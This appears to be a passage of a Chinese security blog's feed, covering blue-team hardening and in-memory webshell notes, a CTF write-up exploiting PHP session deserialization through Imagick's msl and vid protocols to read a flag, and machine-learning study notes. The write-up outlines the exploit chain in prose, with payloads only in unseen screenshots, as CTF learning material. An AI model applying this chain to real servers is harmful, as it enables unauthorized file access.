VPN 技术：VPN 技术可以在公网上建立一个私有网络，加密传输数据流量，从而防止攻击者获取敏感信息。<br>    3.使用匿名浏览器：匿名浏览器可以隐藏用户真实的 IP 地址和浏览痕迹，使得攻击者无法追踪用户的真实身份和行为。<br>    4.使用虚假数据：在攻击流量中混入虚假的数据，如虚假的 IP 地址、协议和端口等信息，可以混淆攻击者的追踪。</p><h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>注入型内存马：通过利用漏洞将恶意代码注入到正常进程中，从而在内存中运行。<br>自执行型内存马：将恶意代码写入自启动项，启动后自动运行。<br>进程注入型内存马：利用进程注入技术，在受感染进程的内存中运行恶意代码。<br>Hook 型内存马：利用 Windows API 的 Hook 机制，修改进程中的关键函数，从而运行恶意代码。<br>要判断内存马的类型，可以使用反病毒软件或专门的安全工具对受感染主机进行扫描和分析。一般来说，不同类型的内存马会留下不同的痕迹和特征，比如某些进程的不正常行为、异常的网络连接等等。</p><h2 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h2><p>注入型内存马：修复漏洞、升级软件，加强网络安全防护等方法来预防类似攻击；对已经感染的主机，可以通过杀掉受感染进程或卸载恶意程序等方式来清除内存马。<br>自执行型内存马：可以通过清理自启动项、卸载恶意程序等方式来清除内存马。<br>进程注入型内存马：可以通过杀掉受感染进程或卸载恶意程序等方式来清除内存马。<br>Hook 型内存马：可以通过还原 Hook、修复关键函数、杀掉受感染进程或卸载恶意程序等方式来清除内存马。</p><h1 id="基线检查"><a href="#基线检查" class="headerlink" title="基线检查"></a>基线检查</h1><h2 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h2><h3 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h3><ul><li>检查特殊账号，是否存在空密码的账户和root权限账户</li><li>禁用或删除无用账号</li><li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li><li>禁止root远程登录，限制root用户直接登录。</li><li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li></ul><h3 id="服务-1"><a href="#服务-1" class="headerlink" title="服务"></a>服务</h3><ul><li>关闭不必要的服务</li><li>SSH服务安全<ul><li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li><li>修改SSH使用的协议版本为2</li><li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li></ul></li></ul><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><ul><li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li><li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li></ul><h3 id="日志-2"><a href="#日志-2" class="headerlink" title="日志"></a>日志</h3><ul><li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li><li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li></ul><h3 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h3><ul><li>远程登录取消telnet采用ssh</li><li>设置&#x2F;etc&#x2F;hosts.allow和deny</li><li>禁止ICMP重定向</li><li>禁止源路由转发</li><li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li></ul><h2 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h2><blockquote><p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>账号</li><li>授权</li><li>日志</li><li>session过期时间（防ddos</li><li>绑定监听地址</li></ul><h3 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h3><ul><li>目录权限</li><li>访问外部文件</li><li>CGI</li><li>非法HTTP方法（PUT DELETE）</li></ul><h3 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h3><ul><li>服务版本号</li><li>重定向错误页面</li></ul><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul><li>配置文件</li><li>默认安装的无用文件</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h1><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a><strong>守护进程</strong></h2><p>守护进程是什么？ 其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 守护进程的本质是什么？ </span><br>守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：<span class="hljs-attribute">pid</span>=sid=gid） <br>后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 守护进程有什么特点？ </span><br>没有控制终端，终端名设置为？号 <br>父进程不是用户创建的进程，一般由init进程或者systemd（<span class="hljs-attribute">pid</span>=1）的进程为父进程 <br>进程名字通常以字母 d 结束 <br>工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘 <br>以kthreadd内核进程创建的守护进程以kthreadd为父进程<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 守护进程如何设置？ </span><br>执行一个<span class="hljs-keyword">fork</span>()，之后父进程退出，子进程继续执行。 <br>子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。 <br>在setsid()调用之后执行第二个<span class="hljs-keyword">fork</span>()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。 （根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个<span class="hljs-keyword">fork</span>()调用不会带来任何坏处。） <br>使用 <span class="hljs-keyword">umask</span>(<span class="hljs-number">0</span>); 清除进程的<span class="hljs-keyword">umask</span>以确保当daemon创建文件和目录时拥有所需的权限。 <span class="hljs-number">5</span>. 修改进程的当前工作目录，通常会改为根目录（/）。 <span class="hljs-number">6</span>. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 守护进程如何删除？ </span><br>首先<span class="hljs-built_in">ps</span> axj | grep 守护进程名字，找到相应的守护进程，然后使用<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span> 守护进程名杀掉；<br>利用<span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span>命令查找相应的守护进程，再用<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span>命令将其杀死；<br>创建shell脚本对进程的启动、关闭、重启进行自动管理。 注：<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span> <span class="hljs-literal">-pid</span>   （杀掉进程组）<br></code></pre></td></tr></table></figure><h3 id="screen-的原理"><a href="#screen-的原理" class="headerlink" title="screen 的原理"></a><strong>screen 的原理</strong></h3><ul><li>当用户启动 Screen 时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由 Screen 守护进程负责接收和处理。</li><li>守护进程通过与 Unix 域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen 实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。</p><p>需要注意的是，虽然 Screen 的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的 SSH 连接断开或终端关闭。这是 Screen 的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h3 id="恢复守护进程会话的交互"><a href="#恢复守护进程会话的交互" class="headerlink" title="恢复守护进程会话的交互"></a><strong>恢复守护进程会话的交互</strong></h3><p>可以使用 <code>nohup</code> 命令启动一个守护进程，并将输出重定向到文件中，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ./your_daemon &amp;<br></code></pre></td></tr></table></figure><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用 <code>jobs</code> 命令查看守护进程的状态，并使用 <code>fg</code> 命令将其调至前台，恢复与之前会话的交互。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">jobs<br>fg %job_id<br></code></pre></td></tr></table></figure><p>其中，<code>job_id</code> 是守护进程的作业号，可以在 <code>jobs</code> 命令的输出中找到</p><h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p>IDS（Intrusion Detection System）入侵检测系统</p><p>IPS (Intrusion Prevention System)  入侵防御系统</p><blockquote><p>与防火墙相似，IPS 内嵌部署到流量中。IPS 是一个主动的网络组件，会检查每个通过的数据包，并根据其配置和策略采取正确的补救措施。相反，IDS 是一个被动组件，通常不会内嵌部署，而是通过 SPAN 或 TAP 技术监控流量，然后发出通知</p></blockquote><h3 id="IPS-阻断"><a href="#IPS-阻断" class="headerlink" title="IPS 阻断"></a>IPS 阻断</h3>]]></content>
    
    
    <categories>
      
      <category>蓝队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝队</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tp5.1反序列化漏洞复现</title>
    <link href="/2024/03/21/tp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/03/21/tp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<div class="row">    <embed src="/pdf/tp5.1反序列化漏洞复现.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fumo_backdoor复现</title>
    <link href="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>php代码审计，phpsession反序列化利用</p><h2 id="Imgaick类"><a href="#Imgaick类" class="headerlink" title="Imgaick类"></a>Imgaick类</h2><p>（vid:msl与mvg协议)</p><h3 id="msl语法基础"><a href="#msl语法基础" class="headerlink" title="msl语法基础"></a>msl语法基础</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/1fcf8e22a17c633d348dc10bd2451570.png" alt="截图"></p><h3 id="vid特性"><a href="#vid特性" class="headerlink" title="vid特性"></a>vid特性</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/848906440bfb201ccc0ce5f5689e741c.png" alt="截图"></p><h3 id="3-msl脚本标签"><a href="#3-msl脚本标签" class="headerlink" title="3 msl脚本标签"></a>3 msl脚本标签</h3><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/dfd6fe5579b65520eaa4e8505e571de5.png" alt="截图">.</p><p>这题用到了上面的base64解密，据博客所说还可以直接使用inline:data:text&#x2F;8BIM;base64实现不符合PPM协议的数据写入</p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/7498bfd512dd2684b33f562988997a92.png" alt="截图"></p><br/><p>接受两个参数，cmd可以实现清除&#x2F;tmp目录与反序列化。</p><p>data构造的链子很简单，__sleep绕过waf后可以实现任意文件读取可以无法触发（需要序列化），__wakeup存在new $class($argv),想到原生类，这里利用了Imagick类</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>三个利用点：需要触发sleep魔术方法来读取文件，同时wakeup会导致无参rce（并不可以直接利用）以及原生类利用（这里用到imagick）</p><p>利用imgick漏洞将flag移动到&#x2F;tmp目录之后</p><p>将一段恶意数据设置到&#x2F;tmp&#x2F;sessxxx目录下，path设置在flag相应目录</p><p>利用vid:msl:&#x2F;tmp&#x2F;php*上传上面的数据到&#x2F;tmp&#x2F;sess_user中</p><p>触发phpsess反序列化来调用wakeup</p><h2 id="0"><a href="#0" class="headerlink" title="0"></a>0</h2><p>清空tmp目录</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/f8b8571bcb7f9390f01b8c83d0e69bb2.png" alt="截图"></p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>创建一个写入了脏数据的PPM图片，末尾是复制之后的flag路径，最终用来触发readfile函数</p><blockquote><p><a href="https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html">https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html</a></p></blockquote><p>（PPM图片允许末尾写入脏数据并且不被imagic忽略）</p><br/><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/185f0736880412afc3b83c963e308892.png" alt="截图"></p><p>则在末尾写入数据,重要的是数据的大小要符合PPM要求</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/7f6a7e609d6b27fbb324b2960149bef6.png" alt="截图"></p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/cf76657af9f1518ef05dc60103b468bc.png" alt="截图"></p><br/><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>触发wakeup魔术方法利用imagick把上面的图片存入sess_user中</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/3f1d0fb4e117b8c3449602b3ec5765c5.png" alt="截图"></p><p>将上面的图片数据修改为对应格式<img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/db561b80a3827e9584b64354f5ee767d.png" alt="截图"></p><p>本身是想用postman上传的，但是没找着发包的内容导致检查不了，就直接用bp发包了</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/1d902bf270a623ee5e8132229547abc5.png" alt="截图"></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>imagick的mvg协议将flag复制到res中</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/c1860808ffa62ecfc54d11a4936bff0e.png" alt="截图"></p><br/><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>启动session传入PHPSESSION反序列化sess_user来触发__sleep方法</p><p><img src="/2023/10/28/fumo-backdoor%E5%A4%8D%E7%8E%B0/e247883ae9dc771e95c8ffe6abbbfa1b.png" alt="截图"></p><pre><code class="hljs">    最后发包就应该能获取flag的，这里可能本地环境有点问题....复现的大佬也说有时候要多试几次，我这边一直没出![截图](93b0dda5e3dba6abe80ceccaf4d888b3.png)</code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>最后整理一下漏洞触发的流程</p><p>当我们开启session并且访问对应的php_user文件时会将他的内容反序列化，</p><p>这个文件是先前被攻击者利用imagick恶意写入的，因此存在脏数据（反序列化时会访问&#x2F;tmp&#x2F;xxx文件）</p><p>并且攻击者已经利用imagick协议将flag写入到&#x2F;tmp&#x2F;xxx文件中</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://www.yuque.com/dat0u/ctf/utr6r6bhaltes2yv">https://www.yuque.com/dat0u/ctf/utr6r6bhaltes2yv</a></p><p><a href="https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#%E6%A0%B7%E9%A2%98-ciscn2022-backdoor">https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#%E6%A0%B7%E9%A2%98-ciscn2022-backdoor</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习</title>
    <link href="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>雕刻：决定项目内容，界定范围</p><p>收集数据，确认标签</p><p>训练，错误分析，迭代</p><p>监控性能，维持</p><h3 id="监督学习和非监督学习"><a href="#监督学习和非监督学习" class="headerlink" title="监督学习和非监督学习"></a>监督学习和非监督学习</h3><p>前者给出明确数据集，后者自动优化算法实现分类</p><h3 id="多类特征"><a href="#多类特征" class="headerlink" title="多类特征"></a>多类特征</h3><p>上标 i 说明是第几组数据（一个列表），下标 j 是一组数据中的第几个的特征值</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Mthzb7XIUogEntxwU92c5gh6nTd.png"></p><h3 id="特征缩放"><a href="#特征缩放" class="headerlink" title="特征缩放"></a>特征缩放</h3><p>通过对数据权重的缩放来保证机器学习的合理性</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/S53fbcb1Vo1dWFxtoBtcGvFgnqd.png"></p><p>例如上图数据，x1 权重高导致 x 的轻微改变都会导致数据变化过大，从而成本函数等高线图是一个椭圆，梯度下降难以进行，总体上让数据接近 1</p><p>方法：</p><p>除以最大值</p><p>均值归一  减去平均值然后除以最大最小值的差</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/K2j7btkf6o6zAIxggI2czn8ynjf.png"></p><p>z-score 归一化 减去平均值除以标准差</p><h3 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h3><p>例如房子使用 wx1+wx2+b 来估测，x1 与 x2 是长和宽 可以建立一个 x3 为面积 然后用 w3+wx1+wx2+ 估测</p><h3 id="数据增强"><a href="#数据增强" class="headerlink" title="数据增强"></a>数据增强</h3><p>改变数据（例如旋转图片，给图片加底噪）来增大数据集</p><h3 id="基线"><a href="#基线" class="headerlink" title="基线"></a>基线</h3><p>选择一个值来作为误差的参考值，例如识别图像时人的正确率</p><h3 id="迁移学习"><a href="#迁移学习" class="headerlink" title="迁移学习"></a>迁移学习</h3><p>利用已经训练过的神经网络，通过改变输出层的参数或者改变所有参数来应用于自身的模型</p><h3 id="误差度量"><a href="#误差度量" class="headerlink" title="误差度量"></a>误差度量</h3><p>例如现在有一个罕见的疾病，其发生率是百分之零点五，如今有多个算法，其中一个算法永远输出“没有疾病”，他的误差就只有百分之零点五，但是显然这个算法是没有意义的</p><p>精度：成功预测病人有病&#x2F;共预测病人有病数量</p><p>(预测的病人大概率是真的）</p><p>召回：成功预测病人有病&#x2F;真实病人有病数量</p><p>（有病的病人大概率被预测出来）</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/L6wTbAWiBoHRGIx8AwCc8T87nPc.png"></p><p>逻辑回归：当门槛升高，意味着需要更高的预测值才会判断有病，这会导致精度更高，同时召回更低</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/CJFNb11uAoD6oMxeOJPcMVNPnih.png"></p><p>计算 f1 score（调和平均数），较小的数据会导致分母过大，然后去总体大的数据</p><h2 id="监督学习算法"><a href="#监督学习算法" class="headerlink" title="监督学习算法"></a>监督学习算法</h2><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><p>w 变化率，b 常数</p><h3 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LrgPbMSqxowHACxh2RJcraXMnBb.png"></p><p>决策边界：wx+b＝0 也就是令 sigmoid 函数的参数为零，通过选择更合适的 z 函数会使得决策边界更加合理，从而良好的预测数据</p><p>g：sigmoid function</p><h3 id="softmax-回归"><a href="#softmax-回归" class="headerlink" title="softmax 回归"></a>softmax 回归</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/QV6sbAN70oBsHFxhVqFcvyGKnog.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ZV1IbrIHgoiIOOxKZHVcU9T5n6e.png"></p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/XlLlbccPqoDHuUxHkvRcYzw4ngr.png"></p><p>（输入层）特征向量 x 在隐藏层的作用下变成了激活值（此过程是多次重复的，次数取决于有几个隐藏层，输出的激活值个数取决于这一层中有多少个神经元，其本质类似于特征工程，是通过特定小逻辑回归（g 是 sigmoid function 也叫做激活函数，也可以是其他算法）</p><p>单元&#x2F;函数将输入的向量转化为几个激活值，例如：价格与运输费在一个神经元的作用下转换为“可负担性”）</p><p>最终进入输出层并给出结果（逻辑运算，这一步的算法取决于输出的需要是什么结果，例如二分法就可以用 sigmoid 函数）。层数&#x3D;隐藏 + 输出，</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LlC0bTreBoli2axPe9bcjPzqnlZ.png"></p><p>上下标理解：如图层 3，w b 是第三层的参数，第一个 a 是第三层的输出值也是第四层的输入，第二个 a 是第二层的输出也是第三层的输入，下标代表第几个神经元</p><p>前向传播：神经元减少</p><p>多标签分类：对于某一组输入值需要进行多个二元判断，如有无汽车，有无单车，输出一个 01 数组</p><p>多成本分类：对于某一组输入值需要判断他的类型吗，如可以是汽车，单车，行人而非输出是与不是</p><h4 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h4><p>将图像矩阵二进制化，根据多个特征制作出多个卷积核，矩阵相乘实现卷积化，接下来对数据进行压缩同时避免过拟合的发生（池化），对一个区域内的数据取一个特定的值，最后来到激活层，一般使用 Relu 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LbcLbE39Zod5BkxjEZzc71FmnDg.png"></p><h4 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h4><p>当我们想要神经元根据输入的输出得到不同的输出的时候就需要考虑激活函数的使用</p><p>sigmoid 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/TD2Hbd8M3oTMaYxep4gckhC3nlg.png"></p><p>ReLU 函数</p><p>隐藏层最多见的激活函数，其运算简单，坡度大便于进行梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/LjYxbtFKconA38x7x4hcowAdnbd.png"></p><p>线性激活函数（无激活函数）</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/KxwJbMT0EoSlNrxYuLmcfMk8nKf.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h3><p>根节点，决策节点，叶节点</p><h4 id="信息增益（熵的减少）"><a href="#信息增益（熵的减少）" class="headerlink" title="信息增益（熵的减少）"></a>信息增益（熵的减少）</h4><p>选择减少最多的</p><p>P：目标在这个分组中的数目   w：这个分组的总数除以分组前总数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/H3NJbonoFoz3gSxxmdBcQfa9neL.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/NPuObTtrIo1SWWxvZjScgDyVneb.png"></p><h4 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h4><p>为了避免过度拟合，需要有终止条件</p><p>1.完全纯洁</p><p>2.限制最大深度</p><p>3.信息增益太小（熵减少的少）</p><p>4.某个节点例子过少</p><h4 id="树集合（Ensembles-tree）"><a href="#树集合（Ensembles-tree）" class="headerlink" title="树集合（Ensembles tree）"></a>树集合（Ensembles tree）</h4><p>由于原本的决策树会受到某个数据的改变而产生巨大变化，则通过不同数据创建多个树</p><p>替换：例如在十个样例中，每次抽取一个样例，然后再放回，再在十个之中抽取一个</p><p>xgboost：增大下次决策时抽取上次失败的样例的概率</p><h4 id="回归树"><a href="#回归树" class="headerlink" title="回归树"></a>回归树</h4><p>例如要预测 xx 脸 xx 耳朵动物的体重，则根据方差权重后的差值来选择</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ZD1rbCYIlor2ggxULDKch0ognhc.png"></p><h2 id="无监督学习算法"><a href="#无监督学习算法" class="headerlink" title="无监督学习算法"></a>无监督学习算法</h2><h3 id="k-means-聚类算法"><a href="#k-means-聚类算法" class="headerlink" title="k-means 聚类算法"></a>k-means 聚类算法</h3><p>在数据集中随机取 n 个点（簇质心），对于所有数据，选择离得最近的点，然后将 n 个点移到最近的点的平均值上，重复以上步骤直到这 n 个点不再变化</p><h2 id="代价"><a href="#代价" class="headerlink" title="代价"></a>代价</h2><h3 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h3><p>j 来代表数据与预测值之间的差</p><h4 id="平方误差成本函数"><a href="#平方误差成本函数" class="headerlink" title="平方误差成本函数"></a>平方误差成本函数</h4><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Iwptb7HaFozSF4x1qdOcEdEPncb.png"></p><p>在计算逻辑回归的时候会导致代价函数变成如下，就不能使用梯度下降来得到合理值了</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/IW5jballao1cT6xGf0XcDBEAnNg.png"></p><h4 id="逻辑回归损失函数"><a href="#逻辑回归损失函数" class="headerlink" title="逻辑回归损失函数"></a>逻辑回归损失函数</h4><p>也叫 binary cross-entropy function 二进制交叉熵</p><p>根据预估是 1 还是 0 来选择自己的模型 L 是 loss 函数</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Z5QJbPxRCoRezaxA55ocri3qn6e.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/G37bbpRaYof7YexLBHWcHgDtnng.png"></p><p>例如 y&#x3D;1，预估值为</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/YzaNbkVRFogThnxm4edcTI3RnAf.png"></p><p>会得到如下函数，越接近 1 计算出来的成本 loss 就会越小，越接近 0loss 越大而且增长率高</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/MNbUb1A4Io7E5KxsvUtcEnTfnsh.png"></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="softmax-回归损失函数"><a href="#softmax-回归损失函数" class="headerlink" title="softmax 回归损失函数"></a>softmax 回归损失函数</h4><p>Sparse categorical cross-entropy 稀疏范畴交叉熵</p><p>可以输出多种结果而非二分</p><p>与上同理，当 y&#x3D;1，得到的 a1 越接近 1 损失越小</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/KcDWbrGQJoSbv6xB3JKcyPtXnJb.png"></p><h4 id="熵"><a href="#熵" class="headerlink" title="熵"></a>熵</h4><p>用来衡量纯洁度，越接近百分之五十的时候熵越高，即越不纯洁</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/HsgTbjCLoo7Q6Gx7aJ8cG65YnAf.png"></p><p><img 